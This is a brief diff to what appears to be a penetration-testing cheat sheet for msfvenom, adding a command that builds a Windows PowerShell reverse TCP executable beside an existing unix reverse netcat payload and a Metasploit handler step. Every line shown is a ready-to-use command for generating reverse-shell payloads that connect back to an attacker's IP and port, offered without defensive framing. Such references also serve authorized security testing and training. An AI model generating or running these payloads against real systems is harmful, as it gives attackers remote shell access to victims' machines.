@@ -40,6 +40,11 @@ Creating a reverse tcp netcat comamnd
 msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<port> R
 ```
 
+### [Unique Reverse TCP]
+```
+msfvenom -p windows/powershell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > pshell.exe
+```
+
 ### [Handler]
 msf5 > use exploit/multi/handler
 
